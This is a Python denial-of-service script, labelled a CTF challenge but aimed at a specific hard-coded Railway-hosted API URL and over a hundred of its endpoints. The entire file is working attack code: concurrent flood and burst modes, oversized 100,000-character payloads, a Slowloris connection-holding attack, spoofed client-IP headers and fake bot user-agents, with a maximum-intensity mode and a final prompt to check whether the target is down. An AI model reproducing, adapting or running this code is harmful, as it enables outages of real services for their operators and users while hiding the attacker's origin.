#!/usr/bin/env python3
"""
DDoS Stress Test - CTF Challenge
Termux Compatible Version

Target: https://hashu-apis-production-0857.up.railway.app/

This script performs various stress test techniques to bring the target down:
1. Flood Attack - Rapid concurrent requests to all endpoints
2. Heavy Parameter Attack - Large payloads causing processing overhead
3. Burst Attack - Maximum requests in minimum time
4. Multi-Vector Attack - Combines all methods simultaneously

Usage:
    python3 ddos.py --method burst --threads 200 --duration 60
"""

import requests
import threading
import time
import random
import sys
import argparse
import signal
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

# ─── Configuration ────────────────────────────────────────────────────────────

TARGET = "https://hashu-apis-production-0857.up.railway.app"

ENDPOINTS = [
    "/api/quote", "/api/uuid", "/api/myip", "/api/advice", "/api/trivia",
    "/api/joke", "/api/catfact", "/api/dogimage", "/api/dice", "/api/coinflip",
    "/api/8ball", "/api/riddle", "/api/wouldyourather", "/api/truthordare",
    "/api/anime/quote", "/api/anime/random", "/api/waifu", "/api/emoji",
    "/api/loremtext", "/api/facts", "/api/activity", "/api/numberfact",
    "/api/randomuser", "/api/randomimage", "/api/randompalette",
    "/api/horoscope/daily", "/api/numerology", "/api/zodiac",
    "/api/weather", "/api/currency", "/api/time", "/api/timezone",
    "/api/country", "/api/flag", "/api/bmi", "/api/agecalc",
    "/api/agepredict", "/api/genderpredict", "/api/nationality",
    "/api/color", "/api/colorname", "/api/palindrome",
    "/api/leetspeak", "/api/reversetext", "/api/slugify", "/api/countdown",
    "/api/base64", "/api/base32", "/api/morsecode", "/api/caesarcipher",
    "/api/binarycode", "/api/anagram", "/api/hash", "/api/passwordgen",
    "/api/passwordstrength", "/api/textcase", "/api/textstats",
    "/api/synonym", "/api/rhyme", "/api/dictionary", "/api/translate",
    "/api/detectlanguage",
    "/api/ai/chat", "/api/ai/story", "/api/ai/roast", "/api/ai/poem",
    "/api/ai/quiz", "/api/ai/rewrite", "/api/ai/motivate",
    "/api/ai/compliment", "/api/ai/pickupline", "/api/ai/nameideas",
    "/api/ai/joke", "/api/ai/caption", "/api/ai/bio", "/api/ai/horoscope",
    "/api/ai/dreaminterpret", "/api/ai/eli5", "/api/ai/apology",
    "/api/aiimage", "/api/neontext", "/api/quotecard",
    "/api/wallpaper", "/api/qrcode", "/api/barcode",
    "/api/screenshot", "/api/shorturl", "/api/urlmeta",
    "/api/summarize", "/api/profanityfilter",
    "/api/stock", "/api/news", "/api/crypto", "/api/forex",
    "/api/movie/search", "/api/tvshow/search", "/api/anime",
    "/api/book/search", "/api/recipe", "/api/cocktail",
    "/api/song/search", "/api/lyrics", "/api/spotify/search",
    "/api/github/user", "/api/github/repo", "/api/github/trending",
    "/api/npm", "/api/pypi", "/api/reddit", "/api/hackernews/top",
    "/api/devto/user", "/api/stackoverflow/user",
    "/api/dns", "/api/whois", "/api/sslcheck", "/api/portcheck",
    "/api/http/headers", "/api/useragent", "/api/mimetype",
    "/api/httpstatus", "/api/announcement", "/api/auth/me",
    "/api/stats", "/api/public/custom-apis",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "PostmanRuntime/7.40.0",
    "python-requests/2.32.3",
    "curl/8.7.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
]

# Counters
stats = {
    "total_requests": 0,
    "successful": 0,
    "errors": 0,
    "timeouts": 0,
    "status_codes": {},
    "start_time": 0,
}
stats_lock = threading.Lock()
running = True


def signal_handler(sig, frame):
    global running
    running = False
    print("\n[!] Attack stopped.")


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def random_headers():
    """Generate randomized request headers."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "application/json, text/plain, */*",
            "*/*",
            "application/json",
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "si-LK,si;q=0.9",
            "fr-FR,fr;q=0.9", "de-DE,de;q=0.9",
        ]),
        "Connection": "close",
        "Cache-Control": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Origin": TARGET,
        "Referer": TARGET + "/",
    }


def random_api_key():
    """Generate random API key."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    length = random.randint(16, 64)
    return "".join(random.choice(chars) for _ in range(length))


def reset_stats():
    global stats
    stats = {
        "total_requests": 0,
        "successful": 0,
        "errors": 0,
        "timeouts": 0,
        "status_codes": {},
        "start_time": time.time(),
    }


def make_request(target):
    """Make a single HTTP request."""
    global running
    if not running:
        return

    endpoint = random.choice(ENDPOINTS)
    url = target + endpoint
    headers = random_headers()
    params = {"apiKey": random_api_key()}

    if random.random() < 0.3:
        params["text"] = random.choice(["test", "hello", "world", "api", "CTF", "hack"])

    try:
        if random.random() < 0.2:
            resp = requests.post(url, json=params, headers=headers, timeout=3)
        else:
            resp = requests.get(url, params=params, headers=headers, timeout=3)

        with stats_lock:
            stats["total_requests"] += 1
            code = resp.status_code
            stats["status_codes"][code] = stats["status_codes"].get(code, 0) + 1
            if code == 200:
                stats["successful"] += 1
            elif code >= 500:
                stats["errors"] += 1

    except requests.exceptions.Timeout:
        with stats_lock:
            stats["total_requests"] += 1
            stats["timeouts"] += 1
    except requests.exceptions.ConnectionError:
        with stats_lock:
            stats["total_requests"] += 1
            stats["errors"] += 1
    except Exception:
        with stats_lock:
            stats["total_requests"] += 1
            stats["errors"] += 1


def print_results():
    """Print attack statistics."""
    elapsed = time.time() - stats["start_time"]
    print(f"\n{'='*60}")
    print(f"  ATTACK RESULTS")
    print(f"{'='*60}")
    print(f"  Duration:        {elapsed:.1f}s")
    print(f"  Total Requests:  {stats['total_requests']}")
    print(f"  Successful:      {stats['successful']}")
    print(f"  Server Errors:   {stats['errors']}")
    print(f"  Timeouts:        {stats['timeouts']}")
    if elapsed > 0:
        print(f"  Request Rate:    {stats['total_requests']/elapsed:.1f} req/s")
    print(f"\n  Status Codes:")
    for code, count in sorted(stats["status_codes"].items()):
        print(f"    {code}: {count}")
    print(f"{'='*60}\n")


# ─── Attack Methods ──────────────────────────────────────────────────────────

def flood_attack(target, threads=50, duration=30):
    """Method 1: Flood Attack - rapid concurrent requests."""
    global running
    running = True
    reset_stats()

    print(f"\n{'='*60}")
    print(f"  [1] FLOOD ATTACK")
    print(f"  Target: {target}")
    print(f"  Threads: {threads} | Duration: {duration}s")
    print(f"{'='*60}\n")

    end_time = time.time() + duration

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while time.time() < end_time and running:
            futures = [executor.submit(make_request, target) for _ in range(threads)]
            for f in as_completed(futures):
                try:
                    f.result(timeout=5)
                except:
                    pass

    print_results()


def heavy_param_attack(target, threads=20, duration=30):
    """Method 2: Heavy Parameter Attack - large payloads."""
    global running
    running = True
    reset_stats()

    heavy_endpoints = [
        ("/api/hash", {"apiKey": "", "text": "A" * 100000}),
        ("/api/textcase", {"apiKey": "", "text": "A" * 50000, "type": "upper"}),
        ("/api/base64", {"apiKey": "", "text": "A" * 100000}),
        ("/api/binarycode", {"apiKey": "", "text": "A" * 50000}),
        ("/api/caesarcipher", {"apiKey": "", "text": "A" * 50000, "shift": "13"}),
        ("/api/morsecode", {"apiKey": "", "text": "A" * 50000}),
        ("/api/reversetext", {"apiKey": "", "text": "A" * 100000}),
        ("/api/palindrome", {"apiKey": "", "text": "A" * 50000}),
        ("/api/slugify", {"apiKey": "", "text": "A" * 50000}),
        ("/api/anagram", {"apiKey": "", "text": "A" * 50000}),
    ]

    print(f"\n{'='*60}")
    print(f"  [2] HEAVY PARAMETER ATTACK")
    print(f"  Target: {target}")
    print(f"  Threads: {threads} | Duration: {duration}s")
    print(f"{'='*60}\n")

    end_time = time.time() + duration

    def heavy_request():
        global running
        if not running:
            return
        ep, params_template = random.choice(heavy_endpoints)
        params = params_template.copy()
        params["apiKey"] = random_api_key()
        try:
            resp = requests.get(target + ep, params=params, headers=random_headers(), timeout=5)
            with stats_lock:
                stats["total_requests"] += 1
                stats["status_codes"][resp.status_code] = stats["status_codes"].get(resp.status_code, 0) + 1
        except:
            with stats_lock:
                stats["total_requests"] += 1
                stats["errors"] += 1

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while time.time() < end_time and running:
            futures = [executor.submit(heavy_request) for _ in range(threads)]
            for f in as_completed(futures):
                try:
                    f.result(timeout=10)
                except:
                    pass

    print_results()


def burst_attack(target, threads=100, duration=10):
    """Method 3: Burst Attack - maximum requests in minimum time."""
    global running
    running = True
    reset_stats()

    print(f"\n{'='*60}")
    print(f"  [3] BURST ATTACK")
    print(f"  Target: {target}")
    print(f"  Threads: {threads} | Duration: {duration}s")
    print(f"{'='*60}\n")

    end_time = time.time() + duration

    with ThreadPoolExecutor(max_workers=threads) as executor:
        while time.time() < end_time and running:
            futures = [executor.submit(make_request, target) for _ in range(threads)]
            for f in as_completed(futures):
                try:
                    f.result(timeout=5)
                except:
                    pass

    print_results()


def slowloris_attack(target, num_sockets=100, duration=30):
    """Method 4: Slowloris - keep many connections open."""
    global running
    running = True
    reset_stats()

    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or 443

    print(f"\n{'='*60}")
    print(f"  [4] SLOWLORIS ATTACK")
    print(f"  Target: {host}:{port}")
    print(f"  Sockets: {num_sockets} | Duration: {duration}s")
    print(f"{'='*60}\n")

    sockets = []

    def create_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            partial = f"GET {random.choice(ENDPOINTS)}?apiKey={random_api_key()} HTTP/1.1\r\n"
            partial += f"Host: {host}\r\n"
            partial += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            partial += f"Accept: */*\r\n"
            s.send(partial.encode())
            sockets.append(s)
            with stats_lock:
                stats["total_requests"] += 1
        except Exception:
            with stats_lock:
                stats["errors"] += 1

    end_time = time.time() + duration

    # Create sockets in batches
    for i in range(0, num_sockets, 10):
        if not running:
            break
        batch = min(10, num_sockets - i)
        for _ in range(batch):
            create_socket()
        print(f"[*] {len(sockets)}/{num_sockets} connections open")

    print(f"[*] Keep-alive loop started ({len(sockets)} sockets)")

    # Keep alive
    while time.time() < end_time and running:
        alive = 0
        for sock in sockets:
            try:
                sock.send(b"X-a: b\r\n")
                alive += 1
            except:
                pass
        time.sleep(3)
        remaining = max(0, int(end_time - time.time()))
        print(f"[*] {remaining}s left | {alive}/{len(sockets)} active")

    for sock in sockets:
        try:
            sock.close()
        except:
            pass

    print_results()


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="DDoS Stress Test - CTF (Termux)")
    parser.add_argument("--threads", type=int, default=50, help="Concurrent threads (default: 50)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (default: 60)")
    parser.add_argument("--method", choices=["flood", "heavy", "burst", "slowloris", "all"],
                       default="burst", help="Attack method (default: burst)")
    parser.add_argument("--target", default=TARGET, help="Target URL")
    parser.add_argument("--intense", action="store_true", help="Maximum intensity mode")
    args = parser.parse_args()

    target = args.target

    # Intense mode overrides
    if args.intense:
        args.threads = 300
        args.duration = 120

    banner = f"""
+============================================================+
|       DDoS Stress Test - CTF Challenge (Termux)            |
|  Target: {target:<54}|
|  Threads: {args.threads:<4} | Duration: {args.duration}s                           |
+============================================================+
"""
    print(banner)

    if args.method in ("all", "flood"):
        flood_attack(target, args.threads, args.duration)

    if args.method in ("all", "heavy"):
        heavy_param_attack(target, min(args.threads, 20), args.duration)

    if args.method in ("all", "burst"):
        burst_attack(target, args.threads, min(args.duration, 30))

    if args.method in ("all", "slowloris"):
        slowloris_attack(target, min(args.threads, 100), args.duration)

    print("[+] Attack completed. Check if target is down.")


if __name__ == "__main__":
    main()
